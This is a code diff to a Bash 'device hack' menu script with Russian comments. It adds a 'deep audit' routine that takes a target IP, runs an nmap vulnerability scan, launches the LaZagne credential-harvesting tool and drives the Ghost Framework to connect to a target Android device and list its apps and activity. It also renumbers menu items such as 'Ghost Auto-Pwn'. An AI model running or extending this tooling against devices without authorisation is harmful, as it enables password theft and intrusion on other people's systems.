@@ -851,6 +851,30 @@ search_exploit_db() {
     read -n 1
 }
 
+# Функция: Глубокий аудит устройства
+# Параметры: target_ip
+# Описание: Автоматический сбор паролей, проверка портов и анализ системы
+run_deep_audit() {
+    clear
+    read -p "Введите IP цели для полного аудита: " target_ip
+    [[ -z "$target_ip" ]] && return
+
+    echo -e "\033[1;33m[!] ЭТАП 1: Поиск уязвимостей (Nmap + ExploitDB)...\033[0m"
+    # Сканируем порты и сопоставляем с базой уязвимостей
+    nmap -sV --script=vulners "$target_ip"
+
+    echo -e "\n\033[1;33m[!] ЭТАП 2: Сбор учетных данных (LaZagne)...\033[0m"
+    # Если это ПК, запускаем lazagne. Для Android Ghost сделает это через свои модули.
+    cd /root/lazagne && python3 lazagne.py all -h # Справка или запуск (зависит от ОС цели)
+
+    echo -e "\n\033[1;33m[!] ЭТАП 3: Анализ через Ghost Framework...\033[0m"
+    # Автоматизируем Ghost: подключение -> список софта -> поиск подозрительного
+    cd /root/Ghost && python3 -m ghost --execute "connect $target_ip" --execute "apps" --execute "activity"
+    
+    echo -e "\n\033[1;32m[+] Аудит завершен. Данные сохранены в отчеты.\033[0m"
+    read -n 1 -s -r -p "Нажмите любую клавишу..."
+}
+
 # Основная функция управления
 run_device_hack() {
     while true; do
@@ -858,9 +882,10 @@ run_device_hack() {
         echo -e "\033[1;37m--- УПРАВЛЕНИЕ УСТРОЙСТВАМИ (GHOST) ---\033[0m"
         echo -e "1) Ghost Framework (Manual)"
         echo -e "2) Bluetooth Scan"
-        echo -e "3) Ghost Auto-Pwn (Connect by IP)"
-        echo -e "3) search exploit db"
-        echo -e "B) Back to Main Menu"
+        echo -e "3) Ghost Auto-Pwn (Connect)"
+        echo -e "4) Search ExploitDB"
+        echo -e "5) Full System Audit (Passwords/Vulns)"
+        echo -e "B) Back"
         echo -e "---------------------------------------"
         read -p ">> " dh
 
@@ -868,7 +893,8 @@ run_device_hack() {
             1) launch_ghost_manual ;;
             2) scan_bluetooth_devices ;;
             3) launch_ghost_autopwn ;;
-            4) search_exploit_db ;; # Наш новый пункт
+            4) search_exploit_db ;;
+            5) run_deep_audit ;; # Наш новый мощный пункт
             [Bb]) return ;;
             *) echo "Неверный выбор"; sleep 1 ;;
         esac
